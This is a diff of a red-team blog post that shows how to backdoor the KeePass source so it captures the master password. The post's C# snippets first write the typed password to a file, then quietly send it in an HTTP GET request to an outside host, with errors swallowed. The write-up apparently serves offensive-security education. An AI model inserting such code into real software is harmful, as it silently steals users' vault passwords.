@@ -30,11 +30,13 @@ comments: true
 
 published: true
 
-date: '2022-08-31'
+date: '2022-08-30'
 
 ---
 
-Hey everyone, welcome back to another blog post. August is swiftly coming to a close and I really wanted to try to get one more post out before the month closes. I'm writing this on 8/30 for reference. No idea how long this is going to take, but we're going to run with it.
+Hey everyone!
+
+Welcome back to another blog post. August is swiftly coming to a close and I really wanted to try to get one more post out before the month closes. I'm writing this on 8/30 for reference. No idea how long this is going to take, but we're going to run with it.
 
 For those of you who don't know, I'm now in an internal red team role, this let's me get extra creative as I know our environment really well, for reference, I've worked at the company for 3~ years now and I'm still finding fun and creative ways to bonk people. So - the other day I had my KeePass vault open and thought "Wow, if someone really wanted to, they could yoink my key right out of memory and have most of my passwords". Then I thought "how classic, dumping memory. I'm sure there'd be a more stealthy way". I'm sure there is, so that's what I'll be exploring in todays blog post. 
 
@@ -42,7 +44,7 @@ For those of you who don't know, I'm now in an internal red team role, this let'
 This post will be broken down into 4 different sections:
 - Improvise Adapt, Overcome
 - Analyzing KeePass
-- POC || GTFO
+- POC \|\| GTFO
 - Silent Exfiltration via the Web
 
 In order to get the most out of this post, you should have some prior experience with C#, some basic knowledge of how Password Managers work and an adversarial mindset. Pretty straight forward. Let's dive into it :D
@@ -110,10 +112,10 @@ Out of 1468 files we have 2 occurrences of "Master password:" in KeePass\\Forms\
 It looks like KeyPromptForm.cs is what we're after. Right clicking it and selecting "View Code" will show us the source. We can see in our prior screenshots, we're looking at what I'm going to call the m_cbPassword struct. I don't know if this is right, but that's what I'm going to call it. We'll want to see if we can identify what happens when this gets submitted. Searching the KeyPromptForm.cs file, we can see a function called OnBtnOK. Seems OK, a small function that calls another function called "KeyFromUI". This tracks. Clicking on the Function, we can see a declaration:
 
 ```cs
-		internal static CompositeKey KeyFromUI(CheckBox cbPassword,
-			PwInputControlGroup icgPassword, SecureTextBoxEx stbPassword,
-			CheckBox cbKeyFile, ComboBox cmbKeyFile, CheckBox cbUserAccount,
-			IOConnectionInfo ioc, bool bSecureDesktop)
+internal static CompositeKey KeyFromUI(CheckBox cbPassword,
+	PwInputControlGroup icgPassword, SecureTextBoxEx stbPassword,
+	CheckBox cbKeyFile, ComboBox cmbKeyFile, CheckBox cbUserAccount,
+	IOConnectionInfo ioc, bool bSecureDesktop)
 ```
 
 This can be found in KeyUtils.cs on lines 113-116. stbPassword seems to be a relatively interesting variable, its likely that this contains the object we seek - the password! 
@@ -124,17 +126,17 @@ This can be found in KeyUtils.cs on lines 113-116. stbPassword seems to be a rel
 
 Looking at the surrounding function, we can see stbPassword is converted to UTF-8, a more user friendly format. We can also see some attempted validation, so if we want to be extra sure we've got the right thing, we can embed our GET/POST request in the function. As a Proof of Concept, let's just grab *all* the data a user enters. For simplicity of testing to ensure we've got the right field, we can just write the data out to a file. 
 ```cs
-				if(cbPassword.Checked)
-				{
-					pbPasswordUtf8 = stbPassword.TextEx.ReadUtf8();
-					...
-					FileStream fs = File.Open("C:\\Users\\YOURUSER\\Downloads\\notapass.txt", FileMode.Append);
-					fs.Write(pbPasswordUtf8,0, pbPasswordUtf8.Length);
-					fs.Close();
-					...
-					if(bNewKey)
-					{
-						if(!icgPassword.ValidateData(true)) return null;
+if(cbPassword.Checked)
+{
+	pbPasswordUtf8 = stbPassword.TextEx.ReadUtf8();
+	...
+	FileStream fs = File.Open("C:\\Users\\YOURUSER\\Downloads\\notapass.txt", FileMode.Append);
+	fs.Write(pbPasswordUtf8,0, pbPasswordUtf8.Length);
+	fs.Close();
+	...
+	if(bNewKey)
+	{
+		if(!icgPassword.ValidateData(true)) return null;
 ```
 Compiling the code and running KeePass we are presented with roughly what we expect. No visual differences. Now, the magic is supposed to happen after we input the password and press the "OK" button (remember, we got this function from OnBtnOK).
 
@@ -149,22 +151,21 @@ Bingo. We got it. So, now we know definitely what variable contains the password
 ### Silent Exfiltration via the Web
 For our POC, we'll want to move down lower to grab the verified password and not just any password. I think line 147~ (in the IF statement)) is a good place for this, right before the data gets zero'd out from memory. Using the HttpWebRequest library, we can craft a simple HTTP request. The code looks something like so:
 ```cs
-				if (cbKeyFile.Checked) strKeyFile = cmbKeyFile.Text;
-				...
-				try
-				{
-					string url = "https://xss.bananaisu.com/index.html?kp=" + Encoding.UTF8.GetString(pbPasswordUtf8);
-					HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
-					request.Method = "GET";
-					request.GetResponse();
-				}
-				catch
-				{ 
-				}
-				...
-				return CreateKey(pbPasswordUtf8, strKeyFile, cbUserAccount.Checked,
-					ioc, bNewKey, bSecureDesktop);
-			}
+if (cbKeyFile.Checked) strKeyFile = cmbKeyFile.Text;
+	...
+	try
+	{
+		string url = "https://xss.bananaisu.com/index.html?kp=" + Encoding.UTF8.GetString(pbPasswordUtf8);
+		HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+		request.Method = "GET";
+		request.GetResponse();
+	}
+	catch
+	{}
+	...
+	return CreateKey(pbPasswordUtf8, strKeyFile, cbUserAccount.Checked,
+	ioc, bNewKey, bSecureDesktop);
+	}
 
 ```
 
